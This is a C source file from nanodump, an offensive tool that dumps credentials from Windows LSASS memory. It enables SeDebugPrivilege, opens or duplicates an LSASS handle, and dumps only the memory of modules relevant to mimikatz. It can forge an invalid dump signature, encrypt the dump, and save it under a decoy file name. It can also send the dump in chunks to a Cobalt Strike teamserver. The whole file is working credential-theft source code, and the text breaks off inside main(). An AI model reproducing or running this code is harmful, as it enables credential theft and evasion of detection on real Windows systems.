#include "../include/nanodump.h"
#include "../include/beacon.h"
#include "utils.c"
#include "handle.c"
#include "modules.c"
#include "syscalls.c"
#include "debugpriv.c"


void writeat(
    Pdump_context dc,
    ULONG32 rva,
    const PVOID data,
    unsigned size
)
{
    PVOID dst = RVA(
        PVOID,
        dc->BaseAddress,
        rva
    );
    memcpy(dst, data, size);
}

BOOL append(
    Pdump_context dc,
    const PVOID data,
    unsigned size
)
{
    if (dc->rva + size > dc->DumpMaxSize)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "The dump is too big, please increase DUMP_MAX_SIZE.\n"
        );
        return FALSE;
    }
    else
    {
        writeat(dc, dc->rva, data, size);
        dc->rva += size;
        return TRUE;
    }
}

BOOL write_file(
    char fileName[],
    char fileData[],
    ULONG32 fileLength
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = fileLength;
    wchar_t wcFilePath[MAX_PATH];
    wchar_t wcFileName[MAX_PATH];
    PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
    if (!pUnicodeFilePath)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
            (ULONG32)sizeof(UNICODE_STRING),
            GetLastError()
        );
#endif
        return FALSE;
    }

    // create a UNICODE_STRING with the file path
    mbstowcs(wcFileName, fileName, MAX_PATH);
    wcscpy(wcFilePath, L"\\??\\");
    wcsncat(wcFilePath, wcFileName, MAX_PATH);
    pUnicodeFilePath->Buffer = wcFilePath;
    pUnicodeFilePath->Length = wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
    pUnicodeFilePath->Length *= 2;
    pUnicodeFilePath->MaximumLength = pUnicodeFilePath->Length + 2;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        pUnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // create the file
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    intFree(pUnicodeFilePath); pUnicodeFilePath = NULL;
    if (status == STATUS_OBJECT_PATH_NOT_FOUND)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "The path '%s' is invalid.\n",
            fileName
        );
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtCreateFile, status: 0x%lx\n",
            status
        );
#endif
        return FALSE;
    }
    // write the dump
    status = NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        fileData,
        fileLength,
        NULL,
        NULL
    );
    NtClose(hFile); hFile = NULL;
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtWriteFile, status: 0x%lx\n",
            status
        );
#endif
        return FALSE;
    }

    return TRUE;
}

#ifdef BOF
BOOL download_file(
    char fileName[],
    char fileData[],
    ULONG32 fileLength
)
{
    int fileNameLength = strnlen(fileName, 256);

    // intializes the random number generator
    time_t t;
    srand((unsigned) time(&t));

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (rand() & 0x7FFF) << 0x11;
    fileId |= (rand() & 0x7FFF) << 0x02;
    fileId |= (rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    int messageLength = 8 + fileNameLength;
    char* packedData = intAlloc(messageLength);
    if (!packedData)
    {
#ifdef DEBUG
        BeaconPrintf(CALLBACK_ERROR,
            "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
            messageLength,
            GetLastError()
        );
#endif
        return FALSE;
    }

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < fileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(
        CALLBACK_FILE,
        packedData,
        messageLength
    );
    intFree(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    int chunkLength = 4 + CHUNK_SIZE;
    char* packedChunk = intAlloc(chunkLength);
    if (!packedChunk)
    {
#ifdef DEBUG
        BeaconPrintf(CALLBACK_ERROR,
            "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
            chunkLength,
            GetLastError()
        );
#endif
        return FALSE;
    }
    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileLength)
    {
        // send the file content by chunks
        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // send a chunk
        BeaconOutput(
            CALLBACK_FILE_WRITE,
            packedChunk,
            4 + chunkLength
        );
        exfiltrated += chunkLength;
    }
    intFree(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(
        CALLBACK_FILE_CLOSE,
        packedClose,
        4
    );
    return TRUE;
}
#endif

BOOL write_header(
    Pdump_context dc
)
{
    MiniDumpHeader header;
    // the signature might or might not be valid
    header.Signature = dc->Signature;
    header.Version = dc->Version;
    header.ImplementationVersion = dc->ImplementationVersion;
    header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
    header.StreamDirectoryRva = SIZE_OF_HEADER;
    header.CheckSum = 0;
    header.Reserved = 0;
    header.TimeDateStamp = 0;
    header.Flags = MiniDumpNormal;

    char header_bytes[SIZE_OF_HEADER];
    int offset = 0;
    memcpy(header_bytes + offset, &header.Signature, 4); offset += 4;
    memcpy(header_bytes + offset, &header.Version, 2); offset += 2;
    memcpy(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
    memcpy(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
    memcpy(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
    memcpy(header_bytes + offset, &header.CheckSum, 4); offset += 4;
    memcpy(header_bytes + offset, &header.Reserved, 4); offset += 4;
    memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
    memcpy(header_bytes + offset, &header.Flags, 4);
    if (!append(dc, header_bytes, SIZE_OF_HEADER))
        return FALSE;

    return TRUE;
}

BOOL write_directory(
    Pdump_context dc,
    MiniDumpDirectory directory
)
{
    BYTE directory_bytes[SIZE_OF_DIRECTORY];
    int offset = 0;
    memcpy(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
    memcpy(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
    memcpy(directory_bytes + offset, &directory.Rva, 4);
    if (!append(dc, directory_bytes, sizeof(directory_bytes)))
        return FALSE;

    return TRUE;
}

BOOL write_directories(
    Pdump_context dc
)
{
    MiniDumpDirectory system_info_directory;
    system_info_directory.StreamType = SystemInfoStream;
    system_info_directory.DataSize = 0; // this is calculated and written later
    system_info_directory.Rva = 0; // this is calculated and written later
    if (!write_directory(dc, system_info_directory))
        return FALSE;

    MiniDumpDirectory module_list_directory;
    module_list_directory.StreamType = ModuleListStream;
    module_list_directory.DataSize = 0; // this is calculated and written later
    module_list_directory.Rva = 0; // this is calculated and written later
    if (!write_directory(dc, module_list_directory))
        return FALSE;

    MiniDumpDirectory memory64_list_directory;
    memory64_list_directory.StreamType = Memory64ListStream;
    memory64_list_directory.DataSize = 0; // this is calculated and written later
    memory64_list_directory.Rva = 0; // this is calculated and written later
    if (!write_directory(dc, memory64_list_directory))
        return FALSE;

    return TRUE;
}

BOOL write_system_info_stream(
    Pdump_context dc
)
{
    MiniDumpSystemInfo system_info;

    // read the version and build numbers from the PEB
    PVOID pPeb;
    PULONG32 OSMajorVersion;
    PULONG32 OSMinorVersion;
    PUSHORT OSBuildNumber;
    PULONG32 OSPlatformId;
    PUNICODE_STRING CSDVersion;
    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
    OSMinorVersion = RVA(PULONG32, pPeb, OSMINORVERSION_OFFSET);
    OSBuildNumber = RVA(PUSHORT, pPeb, OSBUILDNUMBER_OFFSET);
    OSPlatformId = RVA(PULONG32, pPeb, OSPLATFORMID_OFFSET);
    CSDVersion = RVA(PUNICODE_STRING, pPeb, CSDVERSION_OFFSET);
    system_info.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;

    system_info.ProcessorLevel = 0;
    system_info.ProcessorRevision = 0;
    system_info.NumberOfProcessors = 0;
    // RtlGetVersion -> wProductType
    system_info.ProductType = VER_NT_WORKSTATION;
    //system_info.ProductType = VER_NT_DOMAIN_CONTROLLER;
    //system_info.ProductType = VER_NT_SERVER;
    system_info.MajorVersion = *OSMajorVersion;
    system_info.MinorVersion = *OSMinorVersion;
    system_info.BuildNumber = *OSBuildNumber;
    system_info.PlatformId = *OSPlatformId;
    system_info.CSDVersionRva = 0; // this is calculated and written later
    system_info.SuiteMask = 0;
    system_info.Reserved2 = 0;
#if _WIN64
    system_info.ProcessorFeatures1 = 0;
    system_info.ProcessorFeatures2 = 0;
#else
    system_info.VendorId1 = 0;
    system_info.VendorId2 = 0;
    system_info.VendorId3 = 0;
    system_info.VersionInformation = 0;
    system_info.FeatureInformation = 0;
    system_info.AMDExtendedCpuFeatures = 0;
#endif

    ULONG32 stream_size = SIZE_OF_SYSTEM_INFO_STREAM;
    char system_info_bytes[SIZE_OF_SYSTEM_INFO_STREAM];

    int offset = 0;
    memcpy(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
    memcpy(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
    memcpy(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
    memcpy(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
    memcpy(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
    memcpy(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
    memcpy(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
#if _WIN64
    memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
    memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8); offset += 8;
#else
    memcpy(system_info_bytes + offset, &system_info.VendorId1, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.VendorId2, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.VendorId3, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.VersionInformation, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.FeatureInformation, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.AMDExtendedCpuFeatures, 4); offset += 4;
#endif

    ULONG32 stream_rva = dc->rva;
    if (!append(dc, system_info_bytes, stream_size))
        return FALSE;

    // write our length in the MiniDumpSystemInfo directory
    writeat(dc, SIZE_OF_HEADER + 4, &stream_size, 4); // header + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, SIZE_OF_HEADER + 4 + 4, &stream_rva, 4); // header + streamType + Location.DataSize

    // write the service pack
    ULONG32 sp_rva = dc->rva;
    ULONG32 Length = CSDVersion->Length;
    // write the length
    if (!append(dc, &Length, 4))
        return FALSE;
    // write the service pack name
    if (!append(dc, CSDVersion->Buffer, CSDVersion->Length))
        return FALSE;
    // write the service pack RVA in the SystemInfoStream
    writeat(dc, stream_rva + 24, &sp_rva, 4); // addrof CSDVersionRva

    return TRUE;
}

Pmodule_info write_module_list_stream(
    Pdump_context dc
)
{
    // list of modules relevant to mimikatz
    wchar_t* important_modules[] = {
        L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll",
        L"livessp.dll", L"dpapisrv.dll", L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll",
        L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll", L"eventlog.dll",
        L"wevtsvc.dll", L"termsrv.dll", L"cloudap.dll"
    };
    Pmodule_info module_list = find_modules(
        dc->hProcess,
        important_modules,
        ARRAY_SIZE(important_modules),
        TRUE
    );
    if (!module_list)
        return NULL;

    // write the full path of each dll
    Pmodule_info curr_module = module_list;
    ULONG32 number_of_modules = 0;
    while (curr_module)
    {
        number_of_modules++;
        curr_module->name_rva = dc->rva;
        ULONG32 full_name_length = wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
        full_name_length++; // account for the null byte at the end
        full_name_length *= 2;
        // write the length of the name
        if (!append(dc, &full_name_length, 4))
        {
            free_linked_list(module_list); module_list = NULL;
            return NULL;
        }
        // write the path
        if (!append(dc, curr_module->dll_name, full_name_length))
        {
            free_linked_list(module_list); module_list = NULL;
            return NULL;
        }
        curr_module = curr_module->next;
    }

    ULONG32 stream_rva = dc->rva;
    // write the number of modules
    if (!append(dc, &number_of_modules, 4))
    {
        free_linked_list(module_list); module_list = NULL;
        return NULL;
    }
    BYTE module_bytes[SIZE_OF_MINIDUMP_MODULE];
    curr_module = module_list;
    while (curr_module)
    {
        MiniDumpModule module;
        module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
        module.SizeOfImage = curr_module->size_of_image;
        module.CheckSum = curr_module->CheckSum;
        module.TimeDateStamp = curr_module->TimeDateStamp;
        module.ModuleNameRva = curr_module->name_rva;
        module.VersionInfo.dwSignature = 0;
        module.VersionInfo.dwStrucVersion = 0;
        module.VersionInfo.dwFileVersionMS = 0;
        module.VersionInfo.dwFileVersionLS = 0;
        module.VersionInfo.dwProductVersionMS = 0;
        module.VersionInfo.dwProductVersionLS = 0;
        module.VersionInfo.dwFileFlagsMask = 0;
        module.VersionInfo.dwFileFlags = 0;
        module.VersionInfo.dwFileOS = 0;
        module.VersionInfo.dwFileType = 0;
        module.VersionInfo.dwFileSubtype = 0;
        module.VersionInfo.dwFileDateMS = 0;
        module.VersionInfo.dwFileDateLS = 0;
        module.CvRecord.DataSize = 0;
        module.CvRecord.rva = 0;
        module.MiscRecord.DataSize = 0;
        module.MiscRecord.rva = 0;
        module.Reserved0 = 0;
        module.Reserved0 = 0;

        int offset = 0;
        memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
        memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
        memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
        memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
        memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
        memcpy(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
        memcpy(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
        memcpy(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
        memcpy(module_bytes + offset, &module.Reserved0, 8); offset += 8;
        memcpy(module_bytes + offset, &module.Reserved1, 8);

        if (!append(dc, module_bytes, sizeof(module_bytes)))
        {
            free_linked_list(module_list); module_list = NULL;
            return NULL;
        }
        curr_module = curr_module->next;
    }

    // write our length in the ModuleListStream directory
    ULONG32 stream_size = 4 + number_of_modules * sizeof(module_bytes);
    writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4, &stream_size, 4); // header + 1 directory + streamType

    // write our RVA in the ModuleListStream directory
    writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4 + 4, &stream_rva, 4); // header + 1 directory + streamType + Location.DataSize

    return module_list;
}

BOOL is_important_module(
    PVOID address,
    Pmodule_info module_list
)
{
    Pmodule_info curr_module = module_list;
    while (curr_module)
    {
        if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
            (ULONG_PTR)address < RVA(ULONG_PTR, curr_module->dll_base, curr_module->size_of_image))
            return TRUE;
        curr_module = curr_module->next;
    }
    return FALSE;
}

PMiniDumpMemoryDescriptor64 get_memory_ranges(
    Pdump_context dc,
    Pmodule_info module_list
)
{
    PMiniDumpMemoryDescriptor64 ranges_list = NULL;
    PVOID base_address, current_address;
    PMiniDumpMemoryDescriptor64 new_range;
    ULONG64 region_size;
    current_address = 0;
    MEMORY_INFORMATION_CLASS mic = 0;
    MEMORY_BASIC_INFORMATION mbi;

    while (TRUE)
    {
        NTSTATUS status = NtQueryVirtualMemory(
            dc->hProcess,
            (PVOID)current_address,
            mic,
            &mbi,
            sizeof(mbi),
            NULL
        );
        if (!NT_SUCCESS(status))
            break;

        base_address = mbi.BaseAddress;
        region_size = mbi.RegionSize;
        // next memory range
        current_address = base_address + region_size;

        // ignore non-commited pages
        if (mbi.State != MEM_COMMIT)
            continue;
        // ignore pages with PAGE_NOACCESS
        if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
            continue;
        // ignore mapped pages
        if (mbi.Type == MEM_MAPPED)
            continue;
        // ignore pages with PAGE_GUARD as they can't be read
        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
            continue;
        // ignore modules that are not relevant to mimikatz
        if (mbi.Type == MEM_IMAGE &&
            !is_important_module(
                base_address,
                module_list))
            continue;

        new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
        if(!new_range)
        {
#ifdef DEBUG
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
                (ULONG32)sizeof(MiniDumpMemoryDescriptor64),
                GetLastError()
            );
#endif
            return NULL;
        }
        new_range->next = NULL;
        new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
        new_range->DataSize = region_size;
        new_range->State = mbi.State;
        new_range->Protect = mbi.Protect;
        new_range->Type = mbi.Type;

        if (!ranges_list)
        {
            ranges_list = new_range;
        }
        else
        {
            PMiniDumpMemoryDescriptor64 last_range = ranges_list;
            while (last_range->next)
                last_range = last_range->next;
            last_range->next = new_range;
        }
    }
    return ranges_list;
}

PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
    Pdump_context dc,
    Pmodule_info module_list
)
{
    PMiniDumpMemoryDescriptor64 memory_ranges;
    ULONG32 stream_rva = dc->rva;

    memory_ranges = get_memory_ranges(
        dc,
        module_list
    );
    if (!memory_ranges)
        return NULL;

    // write the number of ranges
    PMiniDumpMemoryDescriptor64 curr_range = memory_ranges;
    ULONG64 number_of_ranges = 0;
    while (curr_range)
    {
        number_of_ranges++;
        curr_range = curr_range->next;
    }
    if (!append(dc, &number_of_ranges, 8))
    {
        free_linked_list(memory_ranges); memory_ranges = NULL;
        return NULL;
    }

    // write the rva of the actual memory content
    ULONG32 stream_size = 16 + 16 * number_of_ranges;
    ULONG64 base_rva = stream_rva + stream_size;
    if (!append(dc, &base_rva, 8))
    {
        free_linked_list(memory_ranges); memory_ranges = NULL;
        return NULL;
    }

    // write the start and size of each memory range
    curr_range = memory_ranges;
    while (curr_range)
    {
        if (!append(dc, &curr_range->StartOfMemoryRange, 8))
        {
            free_linked_list(memory_ranges); memory_ranges = NULL;
            return NULL;
        }
        if (!append(dc, &curr_range->DataSize, 8))
        {
            free_linked_list(memory_ranges); memory_ranges = NULL;
            return NULL;
        }
        curr_range = curr_range->next;
    }

    // write our length in the Memory64ListStream directory
    writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4, &stream_size, 4); // header + 2 directories + streamType

    // write our RVA in the Memory64ListStream directory
    writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4 + 4, &stream_rva, 4); // header + 2 directories + streamType + Location.DataSize

    // dump all the selected memory ranges
    curr_range = memory_ranges;
    while (curr_range)
    {
        // DataSize can be very large but HeapAlloc should be able to handle it
        PBYTE buffer = intAlloc(curr_range->DataSize);
        if (!buffer)
        {
#ifdef DEBUG
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
                curr_range->DataSize,
                GetLastError()
            );
#endif
            return NULL;
        }
        NTSTATUS status = NtReadVirtualMemory(
            dc->hProcess,
            (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
            buffer,
            curr_range->DataSize,
            NULL
        );
        // once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
        if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY)
        {
#ifdef DEBUG
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...\n",
                (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
                curr_range->DataSize,
                curr_range->State,
                curr_range->Protect,
                curr_range->Type,
                status
            );
#endif
            //return NULL;
        }
        if (!append(dc, buffer, curr_range->DataSize))
        {
            free_linked_list(memory_ranges); memory_ranges = NULL;
            intFree(buffer); buffer = NULL;
            return NULL;
        }
        // overwrite it first, just in case
        memset(buffer, 0, curr_range->DataSize);
        intFree(buffer); buffer = NULL;
        curr_range = curr_range->next;
    }

    return memory_ranges;
}

BOOL NanoDumpWriteDump(
    Pdump_context dc
)
{
    if (!write_header(dc))
        return FALSE;

    if (!write_directories(dc))
        return FALSE;

    if (!write_system_info_stream(dc))
        return FALSE;

    Pmodule_info module_list;
    module_list = write_module_list_stream(dc);
    if (!module_list)
        return FALSE;

    PMiniDumpMemoryDescriptor64 memory_ranges;
    memory_ranges = write_memory64_list_stream(dc, module_list);
    if (!memory_ranges)
    {
        free_linked_list(module_list); module_list = NULL;
        return FALSE;
    }

    free_linked_list(module_list); module_list = NULL;

    free_linked_list(memory_ranges); memory_ranges = NULL;

    return TRUE;
}

#ifdef BOF
void go(char* args, int length)
{
    datap   parser;
    int     pid;
    char*   dump_name;
    BOOL    do_write;
    BOOL    fork;
    BOOL    dup;
    BOOL    use_valid_sig;
    BOOL    success;
    ULONG32 Signature;
    SHORT   Version;
    SHORT   ImplementationVersion;
    BOOL    get_pid_and_leave;

    BeaconDataParse(&parser, args, length);
    pid = BeaconDataInt(&parser);
    dump_name = BeaconDataExtract(&parser, NULL);
    do_write = (BOOL)BeaconDataInt(&parser);
    use_valid_sig = (BOOL)BeaconDataInt(&parser);
    fork = (BOOL)BeaconDataInt(&parser);
    dup = (BOOL)BeaconDataInt(&parser);
    get_pid_and_leave = (BOOL)BeaconDataInt(&parser);

    if (get_pid_and_leave)
    {
        DWORD pid = get_lsass_pid();
        if (!pid)
        {
            BeaconPrintf(
                CALLBACK_ERROR,
                "Failed to find the PID of LSASS.\n"
            );
            return;
        }
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "LSASS PID: %ld\n",
            pid
        );
        return;
    }

    // set the signature
    if (use_valid_sig)
    {
        Signature = MINIDUMP_SIGNATURE;
        Version = MINIDUMP_VERSION;
        ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        generate_invalid_sig(
            &Signature,
            &Version,
            &ImplementationVersion
        );
    }

    success = enable_debug_priv();
    if (!success)
    {
        BeaconPrintf(
            CALLBACK_ERROR,
            "Could not enable 'SeDebugPrivilege'"
        );
        return;
    }

    HANDLE hProcess = obtain_lsass_handle(
        pid,
        fork,
        dup
    );
    if (!hProcess)
        return;

    // allocate a chuck of memory to write the dump
    SIZE_T RegionSize = DUMP_MAX_SIZE;
    PVOID BaseAddress = allocate_memory(&RegionSize);
    if (!BaseAddress)
    {
        NtClose(hProcess); hProcess = NULL;
        return;
    }

    dump_context dc;
    dc.hProcess = hProcess;
    dc.BaseAddress = BaseAddress;
    dc.rva = 0;
    dc.DumpMaxSize = RegionSize;
    dc.Signature = Signature;
    dc.Version = Version;
    dc.ImplementationVersion = ImplementationVersion;

    success = NanoDumpWriteDump(&dc);

    // close the handle
    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(&dc);

    if (success)
    {
        if (do_write)
        {
            success = write_file(
                dump_name,
                dc.BaseAddress,
                dc.rva
            );
        }
        else
        {
            success = download_file(
                dump_name,
                dc.BaseAddress,
                dc.rva
            );
        }
    }

    erase_dump_from_memory(&dc);

    if (success)
    {
        print_success(
            dump_name,
            use_valid_sig,
            do_write,
            TRUE
        );
    }
}

#else

void usage(char* procname)
{
    printf("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--pid 1234] [--help]\n", procname);
    printf("    --write PATH, -w PATH\n");
    printf("            full path to the dumpfile\n");
    printf("    --valid, -v\n");
    printf("            create a dump with a valid signature (optional)\n");
    printf("    --fork, -f\n");
    printf("            fork target process before dumping (optional)\n");
    printf("    --dup, -d\n");
    printf("            duplicate an existing LSASS handle (optional)\n");
    printf("    --pid PID, -p PID\n");
    printf("            the PID of LSASS (required if --fork or --dup are used)\n");
    printf("    --help, -h\n");
    printf("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    int     pid = 0;
    BOOL    fork = FALSE;
    BOOL    dup = FALSE;
    char*   dump_name = NULL;
    ULONG32 Signature;
    SHORT   Version;
    SHORT   ImplementationVersion;
    BOOL    success;
    BOOL    use_valid_sig = FALSE;
    BOOL    get_pid_and_leave = FALSE;

#ifndef _WIN64
    if(IsWoW64())
    {
        printf(
            "Nanodump does not support WoW64\n"
        );
        return -1;
    }
#endif

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "--getpid", 9))
        {
            get_pid_and_leave = TRUE;
        }
        else if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            use_valid_sig = TRUE;
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            dump_name = argv[++i];
            if (!strrchr(dump_name, '\\'))
            {
                printf("You must provide a full path: %s\n", dump_name);
                return -1;
            }
        }
        else if (!strncmp(argv[i], "-p", 3) ||
                 !strncmp(argv[i], "--pid", 6))
        {
            i++;
            pid = atoi(argv[i]);
            if (!pid ||
                strspn(argv[i], "0123456789") != strlen(argv[i]))
            {
                printf("Invalid PID: %s\n", argv[i]);
                return -1;
            }
        }
        else if (!strncmp(argv[i], "-f", 3) ||
                 !strncmp(argv[i], "--fork", 7))
        {
            fork = TRUE;
        }
        else if (!strncmp(argv[i], "-d", 3) ||
                 !strncmp(argv[i], "--dup", 6))
        {
            dup = TRUE;
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            printf("invalid argument: %s\n", argv[i]);
            return -1;
        }
    }

